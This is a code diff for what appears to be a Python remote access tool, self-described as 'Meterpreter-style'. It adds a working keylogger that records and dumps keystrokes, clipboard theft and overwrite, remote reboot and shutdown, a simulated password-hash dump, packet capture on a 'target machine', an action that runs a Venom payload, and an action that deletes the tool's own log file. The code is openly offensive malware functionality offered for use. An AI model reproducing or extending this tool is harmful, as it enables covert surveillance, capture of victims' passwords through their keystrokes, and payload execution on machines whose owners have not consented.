+						key_str = f"[{key.name.upper()}]"
+					
+					self.keylogger_buffer.append({
+						"key": key_str,
+						"time": time.time()
+					})
+			
+			# Start listener in background thread
+			self.listener = keyboard.Listener(on_press=on_press)
+			self.listener.start()
+			
+			return {"status": "Keylogger started"}
+		except Exception as e:
+			self.keylogger_running = False
+			return {"error": f"Failed to start keylogger: {e}"}
+	
+	def stop_keylogger(self):
+		"""Stop keylogger"""
+		if not self.keylogger_running:
+			return {"status": "Keylogger not running"}
+		
+		self.keylogger_running = False
+		
+		try:
+			if self.listener:
+				self.listener.stop()
+		except:
+			pass
+		
+		return {"status": "Keylogger stopped", "keys_captured": len(self.keylogger_buffer)}
+	
+	def dump_keylogger(self):
+		"""Dump keylogger buffer"""
+		if not self.keylogger_buffer:
+			return {"status": "No keys captured"}
+		
+		# Format captured keys
+		keystrokes = ""
+		for entry in self.keylogger_buffer[-1000:]:  # Last 1000 keys
+			keystrokes += entry['key']
+		
+		return {
+			"keystrokes": keystrokes,
+			"count": len(self.keylogger_buffer),
+			"sample": keystrokes[-1000:] if len(keystrokes) > 1000 else keystrokes
+		}
+	
+	def clear_keylogger_buffer(self):
+		"""Clear keylogger buffer"""
+		self.keylogger_buffer = []
+		return {"status": "Keylogger buffer cleared"}
+	
+	# ========== CLIPBOARD ==========
+	
+	def get_clipboard(self):
+		"""Get clipboard contents"""
+		if not WIN32CLIPBOARD_AVAILABLE:
+			return {"error": "win32clipboard not available"}
+		
+		try:
+			win32clipboard.OpenClipboard()
+			data = win32clipboard.GetClipboardData()
+			win32clipboard.CloseClipboard()
+			return {"clipboard": data}
+		except Exception as e:
+			return {"error": str(e)}
+	
+	def set_clipboard(self, text):
+		"""Set clipboard contents"""
+		if not WIN32CLIPBOARD_AVAILABLE:
+			return {"error": "win32clipboard not available"}
+		
+		try:
+			win32clipboard.OpenClipboard()
+			win32clipboard.EmptyClipboard()
+			win32clipboard.SetClipboardText(text)
+			win32clipboard.CloseClipboard()
+			return {"status": "Clipboard set"}
+		except Exception as e:
+			return {"error": str(e)}
+	
+	# ========== SYSTEM COMMANDS ==========
+	
+	def get_network_info(self):
+		"""Get network configuration"""
+		try:
+			if platform.system() == "Windows":
+				result = subprocess.run("ipconfig /all", shell=True, 
+									  capture_output=True, text=True)
+				return {"output": result.stdout}
+			else:
+				result = subprocess.run("ifconfig -a", shell=True,
+									  capture_output=True, text=True)
+				return {"output": result.stdout}
+		except Exception as e:
+			return {"error": str(e)}
+	
+	def reboot_system(self):
+		"""Reboot the system"""
+		try:
+			if platform.system() == "Windows":
+				subprocess.run("shutdown /r /t 0", shell=True)
+			else:
+				subprocess.run("reboot", shell=True)
+			return {"status": "Rebooting..."}
+		except Exception as e:
+			return {"error": str(e)}
+	
+	def shutdown_system(self):
+		"""Shutdown the system"""
+		try:
+			if platform.system() == "Windows":
+				subprocess.run("shutdown /s /t 0", shell=True)
+			else:
+				subprocess.run("poweroff", shell=True)
+			return {"status": "Shutting down..."}
+		except Exception as e:
+			return {"error": str(e)}
+	
+	def dump_hashes(self):
+		"""Simulated hash dump (educational only)"""
+		simulated_hashes = {
+			"note": "This is a SIMULATION for educational purposes",
+			"real_hashes": "Requires admin + SAM/SYSTEM registry or /etc/shadow",
+			"simulated_data": [
+				{"user": "Administrator", "rid": "500", "lm": "aad3b435b51404ee", "ntlm": "31d6cfe0d16ae931b73c59d7e0c089c0"},
+				{"user": "Guest", "rid": "501", "lm": "aad3b435b51404ee", "ntlm": "31d6cfe0d16ae931b73c59d7e0c089c0"},
+				{"user": os.getlogin(), "rid": "1000", "lm": "aad3b435b51404ee", "ntlm": "simulated_hash_here"}
+			]
+		}
+		return simulated_hashes
 
 
 
@@ -1063,10 +1064,10 @@ while True:
 	/    \  \/|  |  \_/ __ \ / __ |/ __ |\__  \\_  __ \
 	\     \___|   Y  \  ___// /_/ / /_/ | / __ \|  | \/
  	\______  /___|  /\___  >____ \____ |(____  /__|   
-    	    \/     \/     \/     \/    \/     \/              
-    
-    Meterpreter-style Remote Access Tool
-    """)
+			\/     \/     \/     \/    \/     \/              
+	
+	Meterpreter-style Remote Access Tool
+	""")
 		
 		config = load_rat_config()
 		
@@ -1739,61 +1740,212 @@ while True:
 #
 #
   
-#action PacketCapture = capturing packets on target machine
-	elif action == "PacketCapture" or action == "packetcapture":
-		logging.info(f"Chosen action PacketCapture to capture packets")
-		run_ps('& "C:\\Program Files\\Wireshark\\dumpcap.exe" -D')
-
-		interface_select = input("Enter network interface to capture packets on (Choose from the list): ")
-
+	elif action.lower() == "packetcapture":
+		logging.info("Chosen action PacketCapture to capture packets")
+		
+		print("\nAvailable interfaces:")
+		subprocess.run([r"C:\Program Files\Wireshark\dumpcap.exe", "-D"])
+		
+		interface_select = input("\nEnter network interface number to capture packets on: ")
+		
 		os.makedirs("results/PacketCapture", exist_ok=True)
-		tcp_capture = f'& "C:\\Program Files\\Wireshark\\dumpcap.exe" -i {interface_select} -w results/PacketCapture/test.pcapng'
-		run_ps(tcp_capture)
-
-		logging.info(f"Started packet capture on interface: {interface_select}")
-		print("Packet capture started, to stop it press CTRL+C in this window")
+		pcap_file = "results/PacketCapture/PacketCapture.pcap"
+		
+		# Delete existing file
+		if os.path.exists(pcap_file):
+			os.remove(pcap_file)
+		
+		print(f"\n{'='*60}")
+		print(f"Starting packet capture on interface: {interface_select}")
+		print(f"Output file: {pcap_file}")
+		print(f"{'='*60}")
+		
+		# Start dumpcap
+		dumpcap_path = r"C:\Program Files\Wireshark\dumpcap.exe"
+		process = subprocess.Popen(
+			[dumpcap_path, "-i", interface_select, "-w", pcap_file, "-P", "-q"],
+			stdout=subprocess.DEVNULL,
+			stderr=subprocess.DEVNULL
+		)
+		
+		print("\n LIVE PACKET COUNTER")
+		print("─" * 30)
+		
+		start_time = time.time()
+		
+		try:
+			import msvcrt
+			import struct
+			
+			print("Status: Starting capture...", end='', flush=True)
+			
+			while True:
+				# Check if process ended
+				if process.poll() is not None:
+					print(f"\n\nCapture ended.")
+					break
+				
+				# Calculate elapsed time
+				elapsed = time.time() - start_time
+				mins, secs = divmod(int(elapsed), 60)
+				
+				# PROPER PACKET COUNTING - Read the PCAP file structure
+				packet_count = 0
+				if os.path.exists(pcap_file) and os.path.getsize(pcap_file) > 24:
+					try:
+						with open(pcap_file, 'rb') as f:
+							# Read PCAP global header (24 bytes)
+							f.seek(0)
+							
+							# Count packets by reading PCAP structure
+							# Skip 24-byte global header
+							f.seek(24)
+							
+							while True:
+								# Read packet header (16 bytes)
+								header = f.read(16)
+								if len(header) < 16:
+									break
+								
+								# Unpack packet header: ts_sec(4), ts_usec(4), incl_len(4), orig_len(4)
+								incl_len = struct.unpack('<I', header[8:12])[0]
+								
+								# Skip packet data
+								f.seek(incl_len, 1)
+								
+								packet_count += 1
+					except:
+						# If we can't parse, use file size estimation
+						size = os.path.getsize(pcap_file)
+						if size > 24:
+							# Better estimation: (size - 24) / avg_packet_size_with_header
+							# Average Ethernet packet ~ 1000 bytes + 16 byte pcap header
+							packet_count = (size - 24) // 1016
+				
+				# Display
+				if packet_count > 0:
+					# Calculate rate
+					if elapsed > 0:
+						rate = packet_count / elapsed
+						print(f"\r {mins:02d}:{secs:02d} |  Packets: {packet_count:,} |  Rate: {rate:.1f} pkt/s | Press 'q' to stop", end='', flush=True)
+					else:
+						print(f"\r {mins:02d}:{secs:02d} |  Packets: {packet_count:,} | Press 'q' to stop", end='', flush=True)
+				else:
+					print(f"\r {mins:02d}:{secs:02d} | Waiting for packets... | Press 'q' to stop", end='', flush=True)
+				
+				# Check for 'q' key
+				if msvcrt.kbhit():
+					key = msvcrt.getch().decode('utf-8', errors='ignore').lower()
+					if key == 'q':
+						print("\n\n'q' pressed. Stopping capture...")
+						break
+				
+				time.sleep(0.5)  # Update twice per second
+				
+		except Exception as e:
+			print(f"\nError: {e}")
+			# Simple fallback
+			print("\nCapture running... Press Enter to stop: ", end='')
+			input()
+		
+		# Stop process
+		if process.poll() is None:
+			process.terminate()
+			time.sleep(1)
+			if process.poll() is None:
+				process.kill()
+		
+		# FINAL ACCURATE COUNT
+		print(f"\n\n{'='*60}")
+		print("STATS")
+		print(f"{'='*60}")
+		
+		final_packet_count = 0
+		if os.path.exists(pcap_file) and os.path.getsize(pcap_file) > 24:
+			try:
+				with open(pcap_file, 'rb') as f:
+					f.seek(24)  # Skip global header
+					import struct
+					
+					while True:
+						header = f.read(16)
+						if len(header) < 16:
+							break
+						
+						incl_len = struct.unpack('<I', header[8:12])[0]
+						f.seek(incl_len, 1)
+						final_packet_count += 1
+						
+			except Exception as e:
+				print(f"Error reading pcap: {e}")
+				size = os.path.getsize(pcap_file)
+				final_packet_count = (size - 24) // 1016  # Fallback estimation
+		
+		duration = time.time() - start_time
+		mins, secs = divmod(int(duration), 60)
+		
+		print(f"Capture duration: {mins:02d}:{secs:02d}")
+		print(f"Total packets: {final_packet_count:,}")
+		
+		if os.path.exists(pcap_file):
+			size = os.path.getsize(pcap_file)
+			size_mb = size / 1024 / 1024
+			print(f"File size: {size:,} bytes ({size_mb:.2f} MB)")
+			
+			if duration > 0 and final_packet_count > 0:
+				avg_packet_size = size / final_packet_count if final_packet_count > 0 else 0
+				packet_rate = final_packet_count / duration
+				data_rate = (size * 8) / duration / 1_000_000  # Mbps
+				
+				print(f"Average packet size: {avg_packet_size:.0f} bytes")
+				print(f"Packet rate: {packet_rate:.1f} packets/sec")
+				print(f"Data rate: {data_rate:.2f} Mbps")
+		
+		print(f"File: {pcap_file}")
+		print(f"{'='*60}")
+		
+		logging.info(f"Packet capture completed. {final_packet_count} packets. File: {pcap_file}")
 		input("Press Enter to continue...")
+	#
+	#
+	#
+	#
+	#
+	#
+	#
+	#
+	#
+	#
 
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-
-#Action Venom = running a Venom payload
+	#Action Venom = running a Venom payload
 	elif action == "Venom" or action == "venom":
 		logging.info(f"Chosen action Venom to run a Venom payload")
 		venom=input("Enter full path to the payload (example D:\\USB\\Attack\\Venom\\payload.exe): ")
 		run_ps(venom)
 
 
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
+	#
+	#
+	#
+	#
+	#
+	#
+	#
+	#
+	#
+	#
 
-#Action LogDelete = deleting the program log file
+	#Action LogDelete = deleting the program log file
 	elif action =="DeleteLog" or action == "deletelog":
-		logging.shutdown()
-		os.remove("logger.log")
+			logging.shutdown()
+			os.remove("logger.log")
 
 
-#
-#
-#
-#
-#
+	#
+	#
+	#
+	#
+	#
 #
 #
 #
